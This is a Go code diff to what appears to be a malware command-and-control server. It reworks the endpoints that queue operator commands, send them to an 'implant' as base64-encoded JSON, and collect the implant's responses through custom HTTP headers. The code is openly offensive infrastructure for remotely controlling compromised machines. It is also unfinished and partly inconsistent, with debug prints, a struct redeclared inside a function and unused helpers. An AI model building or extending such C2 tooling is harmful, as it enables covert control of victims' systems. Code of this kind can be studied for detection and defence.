@@ -5,7 +5,8 @@ import (
 	"net/http"
 	"net"
     "encoding/base64"
-    "strings"
+    "encoding/json"
+    "io/ioutil"
 )
 
 var err error
@@ -16,12 +17,12 @@ var cmdString string
 var commandQueue [][]string 
 
 type Command struct {
-    Group    string
-    Command  string
-    Response string
+	Group    string `json:"Group"`
+	String   string `json:"String"`
+	Response string `json:"Response"`
 }
 
-var responseChan = make(chan Command)
+var responseChan = make(chan interface{})
 
 func main() {
     // Get the server's IP address
@@ -73,66 +74,99 @@ func getServerIP() (string, error) {
     return "", fmt.Errorf("unable to determine server IP address")
 }
 
+
 func handleImplant(w http.ResponseWriter, r *http.Request) {
-    // Parse the URL query parameters
-    queryParams := r.URL.Query()
 
-    // Retrieve the value of 'aa' parameter
-    aaParam := queryParams.Get("aa")
-    // Check if 'aa' parameter is present
-    if aaParam != "" {
-        // Decode the base64-encoded value
-        decodedBytes, err := base64.StdEncoding.DecodeString(aaParam)
-        if err != nil {
-            http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
-            return
-        }
+    serializedData := r.Header.Get("Serialized-Data")
+    uid := r.Header.Get("UID")
+    
+    fmt.Println("UID:", uid)
 
-        decodedString := string(decodedBytes)
-        params := strings.Split(decodedString, "&")
-        paramMap := make(map[string]string)
+    // Receive response
+	if uid != "" {
+        fmt.Println("1")
+		if serializedData != "" {
+            fmt.Println("2")
 
-        for _, param := range params {
-            keyValue := strings.Split(param, "=")
-            if len(keyValue) == 2 {
-                key := keyValue[0]
-                value := strings.TrimSpace(keyValue[1])
-                value = strings.Replace(value, "\r", "\\r", -1) // Replace any carriage returns (\r) with an empty string
-                value = strings.Replace(value, "\\", "\\\\", -1) // Escape any backslashes in the value
-                value = strings.Replace(value, "\n", "\\n", -1) // Remove newlines
-                paramMap[key] = value
+            type Command struct {
+                Group    string `json:"Group"`
+                String   string `json:"String"`
+                Response string `json:"Response"`
             }
-        }
+            // Decode base64 data
+            decodedData, err := base64.StdEncoding.DecodeString(serializedData)
+            if err != nil {
+                http.Error(w, "Failed to decode base64 data", http.StatusInternalServerError)
+                return
+            }
 
-        responseChan <- Command{
-            Group:    paramMap["cmdValue"],
-            Command:  paramMap["cmdString"],
-            Response: paramMap["cmdResponse"],
-        }
+            // Unmarshal JSON data into Command struct
+            var command Command
+            err = json.Unmarshal(decodedData, &command)
+            if err != nil {
+                http.Error(w, "Failed to unmarshal JSON data", http.StatusInternalServerError)
+                return
+            }
 
-    } else {
-        http.Error(w, "No parameter found in the request", http.StatusBadRequest)
-    }
+                // Debugging
+                // Print the JSON data
+                jsonBytes, err := json.MarshalIndent(command, "", "    ")
+                if err != nil {
+                    http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
+                    return
+                }
+                fmt.Println("JSON:", string(jsonBytes))
 
-    if len(commandQueue) != 0 {
-        cmdPair := commandQueue[0]
-        cmdGroup = cmdPair[0]
-        cmdString = cmdPair[1]
 
-        // Define the response body as a string
-        responseBody := "cmdGroup:" + cmdGroup + "\n" +
-        "cmdString:" + cmdString
 
-        // Set Content-Type header
-        w.Header().Set("Content-Type:", "text/plain")
+				fmt.Fprintf(w, "Command received and processed successfully")
 
-        // Set Content-Length header
-        w.Header().Set("Content-Length:", fmt.Sprint(len(responseBody)))
+            } else {
+                fmt.Println("3")
+                http.Error(w, "No serialized data found in the request", http.StatusBadRequest)
+            }
+        } else {
+            http.Error(w, "No UID found in the request", http.StatusBadRequest)
+            return
+        }                
 
-        // Write the response body
-        fmt.Fprintf(w, responseBody)
-        // Remove the processed command pair from the queue
-        commandQueue = commandQueue[1:]
+        fmt.Println("Queue Len: ", len(commandQueue))
+
+        // Provide next command to implant
+        if len(commandQueue) != 0 {
+            retrievedCMD := commandQueue[0]
+            cmdGroup := retrievedCMD[0]
+            cmdString := retrievedCMD[1]
+
+
+    // Create a Command struct for the next command
+            nextCommand := Command{
+                Group:    cmdGroup,
+                String:   cmdString,
+                Response: "", // You might populate this if needed
+            }
+
+            // Marshal the Command struct to JSON
+            jsonData, err := json.Marshal(nextCommand)
+            if err != nil {
+                http.Error(w, "Failed to marshal JSON data", http.StatusInternalServerError)
+                return
+            }
+
+            // Base64 encode the JSON data
+            base64Data := base64.StdEncoding.EncodeToString(jsonData)
+
+            // Set response headers
+            w.Header().Set("Content-Type", "text/plain")
+            w.Header().Set("Content-Length", fmt.Sprint(len(base64Data)))
+
+            // Write the response body
+            fmt.Fprintf(w, "Serialized-Data: %s", base64Data)
+
+            // Send the prepared data through the response channel
+            responseChan <- string(base64Data)
+            // Remove the processed command pair from the queue
+            commandQueue = commandQueue[1:]
     }
 }
 
@@ -144,25 +178,60 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    // Parse form data
-    err := r.ParseForm()
+    // Read request body
+    requestBody, err := ioutil.ReadAll(r.Body)
     if err != nil {
-        http.Error(w, "Failed to parse form", http.StatusBadRequest)
+        http.Error(w, "Failed to read request body", http.StatusInternalServerError)
         return
     }
 
-    // Get cmdGroup and cmdString from form data
-    cmdGroup := r.Form.Get("cmdGroup")
-    cmdString := r.Form.Get("cmdString")
+    // Decode base64 data
+    decodedData, err := base64.StdEncoding.DecodeString(string(requestBody))
+    if err != nil {
+        http.Error(w, "Failed to decode base64 data", http.StatusInternalServerError)
+        return
+    }
 
-    // Store the command in the global commands array
-    commandQueue = append(commandQueue, []string{cmdGroup, cmdString})
+    // Unmarshal JSON data
+    var command Command
+    err = json.Unmarshal(decodedData, &command)
+    if err != nil {
+        http.Error(w, "Failed to unmarshal JSON data", http.StatusInternalServerError)
+        return
+    }
+
+    // Add the command to the commandQueue
+    commandQueue = append(commandQueue, []string{command.Group, command.String})
 
     // Wait for the response from the implant
     response := <-responseChan
 
-    responseJSON := fmt.Sprintf(`{"cmdGroup": "%s", "cmdString": "%s", "cmdResponse": "%s"}`, response.Group, response.Command, response.Response)
-    w.Header().Set("Content-Type", "application/json")
+    // Marshal the response to JSON
+    jsonResponse, err := json.Marshal(response)
+    if err != nil {
+        http.Error(w, "Failed to marshal JSON response", http.StatusInternalServerError)
+        return
+    }
+
+    // Encode JSON response to base64
+    encodedResponse := base64.StdEncoding.EncodeToString(jsonResponse)
+
+    // Write the response back to the client
+    w.Header().Set("Content-Type", "text/plain")
     w.WriteHeader(http.StatusOK)
-    _, _ = w.Write([]byte(responseJSON))
+    _, _ = w.Write([]byte(encodedResponse))
+}
+
+// Helper functions to convert uint32 to bytes and vice versa
+func uint32ToBytes(n uint32) []byte {
+    b := make([]byte, 4)
+    b[0] = byte(n >> 24)
+    b[1] = byte(n >> 16)
+    b[2] = byte(n >> 8)
+    b[3] = byte(n)
+    return b
+}
+
+func bytesToUint32(b []byte) uint32 {
+    return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
 }
